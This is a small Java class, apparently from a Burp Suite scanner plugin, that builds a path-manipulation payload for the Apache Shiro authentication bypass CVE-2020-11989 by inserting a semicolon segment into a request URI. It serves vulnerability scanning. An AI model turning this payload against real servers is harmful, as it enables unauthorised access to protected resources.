package burp.core.scanner.active.shiroscanner;

public class CVE_2020_11989 {
    public String exp;

    CVE_2020_11989(String requestURI){
        if (!requestURI.endsWith("/")) {
            int i = requestURI.indexOf("/");
            String a2 = requestURI.substring(i+1);
            int j = a2.indexOf("/");
            String a3 = requestURI.substring(j+1);
            String a4 = requestURI.substring(i,j+1);
            this.exp = a4+";"+a3;
        }else{
            this.exp = "/xxxxxxxxxxxxxxxxxxxxxx";
        }
    }

    public String getExp() {
        return exp;
    }

    @Override
    public String toString() {
        return "CVE_2020_11989";
    }
}
